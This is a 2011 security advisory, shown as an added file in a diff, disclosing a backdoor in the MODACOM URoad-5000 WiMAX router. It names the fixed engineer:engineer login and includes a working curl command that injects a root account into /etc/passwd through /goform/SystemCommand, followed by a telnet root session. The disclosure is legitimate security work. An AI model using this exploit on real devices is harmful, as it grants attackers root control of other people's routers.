@@ -1,0 +1,60 @@
+      ================================================
+     == Alex Stanev Security Advisory #4 @31.05.2011 ==
+     ==             http://sec.stanev.org            ==
+      ================================================
+
+PRODUCT
+     URoad-5000
+
+VENDOR
+     MODACOM [http://www.modacom.co.kr]
+
+VERSIONS AFFECTED
+     v1450
+
+CLASS
+     Remote command execution/Backdoor
+
+PRODUCT DESCRIPTION
+     URoad-5000 is integrated battery powered wireless router. It comes with only one external USB
+     interface and no other hardware comm interfaces (such as ethernet). Based on RaLink SoC 3050.
+     The USB port is used for connection with MW-U3050, which is USB WiMAX dongle.
+     Linux inside.
+     Often marketed as WiMAX 2 WiFi "converter".
+
+THE PROBLEM
+     The box uses modified version of RaLink SDK. The standard web interface is accessed via HTTP.
+     1) Web administration interface can be accessed with standard user/password pair admin:admin
+     This can be later changed, but there is another possible access pair - engineer:engineer
+     and it can't be changed via the web interface.
+     2) Some of the SDK standard scripts are left and their screens in the web interface are just
+     HTML commented. This reveals the /goform/SystemCommand method.
+
+EXPLOIT
+     1) Remote add r00t user with password boza
+          $curl --basic -u "engineer:engineer" \
+	        -d "command=echo -e \"r00t:CRYM.sLY1U1AI:0:0:Adminstrator:/:/bin/sh\" >> /etc/passwd;&SystemCommandSubmit=Apply" \
+	        192.168.100.254/goform/SystemCommand
+          $telnet 192.168.100.254
+          Trying 192.168.100.254...
+          Connected to 192.168.100.254.
+          modacom login: r00t
+          Password: boza
+          BusyBox v1.12.1 (2010-03-05 21:33:57 KST) built-in shell (ash)
+          Enter 'help' for a list of built-in commands.
+          #
+
+ADDITIONAL INFO
+     The flaw was presented on OpenFest 2010.
+     Presentation: http://openfest.org/files/slides-2010/OpenFest2010_Reverse_engineering_Alex_Stanev.pdf [in bulgarian]
+
+PATCH/WORKAROUND
+     No workaround possible. Next version?
+
+VENDOR STATUS
+     NOT informed. Backdoor.
+
+     =========================
+    ==           EOF         ==
+    == http://sec.stanev.org ==
+     =========================
